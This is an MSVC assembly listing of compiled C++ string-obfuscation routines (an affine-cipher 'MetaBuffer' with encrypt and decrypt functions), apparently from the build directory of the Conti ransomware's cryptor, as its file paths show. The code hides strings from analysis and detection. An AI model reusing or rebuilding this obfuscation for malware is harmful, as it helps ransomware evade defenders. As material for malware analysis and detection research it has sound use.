  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	b8 01 00 00 00	 mov	 eax, 1
  00255	48 6b c0 0d	 imul	 rax, rax, 13
  00259	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00260	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00264	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0026b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00270	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00277	88 41 0e	 mov	 BYTE PTR [rcx+14], al
  0027a	b8 01 00 00 00	 mov	 eax, 1
  0027f	48 6b c0 0e	 imul	 rax, rax, 14
  00283	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0028a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0028e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00295	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0029a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002a1	88 41 0f	 mov	 BYTE PTR [rcx+15], al
  002a4	b8 01 00 00 00	 mov	 eax, 1
  002a9	48 6b c0 0f	 imul	 rax, rax, 15
  002ad	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002b4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002bf	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  002c4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002cb	88 41 10	 mov	 BYTE PTR [rcx+16], al
  002ce	b8 01 00 00 00	 mov	 eax, 1
  002d3	48 6b c0 10	 imul	 rax, rax, 16
  002d7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002de	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002e9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  002ee	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002f5	88 41 11	 mov	 BYTE PTR [rcx+17], al
  002f8	b8 01 00 00 00	 mov	 eax, 1
  002fd	48 6b c0 11	 imul	 rax, rax, 17
  00301	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00308	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0030c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00313	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00318	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0031f	88 41 12	 mov	 BYTE PTR [rcx+18], al
  00322	b8 01 00 00 00	 mov	 eax, 1
  00327	48 6b c0 12	 imul	 rax, rax, 18
  0032b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00332	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00336	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0033d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00342	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00349	88 41 13	 mov	 BYTE PTR [rcx+19], al
  0034c	b8 01 00 00 00	 mov	 eax, 1
  00351	48 6b c0 13	 imul	 rax, rax, 19
  00355	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0035c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00360	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00367	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0036c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00373	88 41 14	 mov	 BYTE PTR [rcx+20], al
  00376	b8 01 00 00 00	 mov	 eax, 1
  0037b	48 6b c0 14	 imul	 rax, rax, 20
  0037f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00386	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0038a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00391	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00396	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0039d	88 41 15	 mov	 BYTE PTR [rcx+21], al
  003a0	b8 01 00 00 00	 mov	 eax, 1
  003a5	48 6b c0 15	 imul	 rax, rax, 21
  003a9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003b0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003bb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  003c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003c7	88 41 16	 mov	 BYTE PTR [rcx+22], al
  003ca	b8 01 00 00 00	 mov	 eax, 1
  003cf	48 6b c0 16	 imul	 rax, rax, 22
  003d3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003da	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003e5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  003ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003f1	88 41 17	 mov	 BYTE PTR [rcx+23], al
  003f4	b8 01 00 00 00	 mov	 eax, 1
  003f9	48 6b c0 17	 imul	 rax, rax, 23
  003fd	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00404	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00408	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0040f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00414	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0041b	88 41 18	 mov	 BYTE PTR [rcx+24], al
  0041e	b8 01 00 00 00	 mov	 eax, 1
  00423	48 6b c0 18	 imul	 rax, rax, 24
  00427	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0042e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00432	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00439	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0043e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00445	88 41 19	 mov	 BYTE PTR [rcx+25], al
  00448	b8 01 00 00 00	 mov	 eax, 1
  0044d	48 6b c0 19	 imul	 rax, rax, 25
  00451	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00458	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0045c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00463	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00468	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0046f	88 41 1a	 mov	 BYTE PTR [rcx+26], al
  00472	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00479	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  0047d	88 85 c0 00 00
	00		 mov	 BYTE PTR tv280[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  00483	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0048a	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00491	5f		 pop	 rdi
  00492	5d		 pop	 rbp
  00493	c3		 ret	 0
??0?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z PROC ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 6c	 sub	 eax, 108		; 0000006cH
  0002d	6b c0 c2	 imul	 eax, eax, -62		; ffffffffffffffc2H
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z PROC ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 2b	 imul	 eax, eax, 43		; 0000002bH
  0002d	83 c0 6c	 add	 eax, 108		; 0000006cH
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 10	 cmp	 QWORD PTR i$1[rbp], 16
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ PROC ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CL@$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<43,108,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
